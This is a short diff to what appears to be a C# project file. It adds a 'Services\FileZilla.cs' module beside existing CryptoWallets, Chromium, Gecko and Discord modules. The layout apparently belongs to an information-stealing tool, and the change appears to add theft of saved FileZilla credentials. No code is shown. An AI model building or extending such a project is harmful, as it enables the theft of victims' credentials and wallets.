@@ -79,6 +79,7 @@
         <Compile Include="ServiceCounter.cs" />
 		<Compile Include="Services\Browsers\IBrowser.cs" />
 		<Compile Include="Services\CryptoWallets.cs" />
+		<Compile Include="Services\FileZilla.cs" />
 		<Compile Include="Services\Gecko.cs" />
         <Compile Include="Services\Chromium.cs" />
         <Compile Include="Services\Discord.cs" />
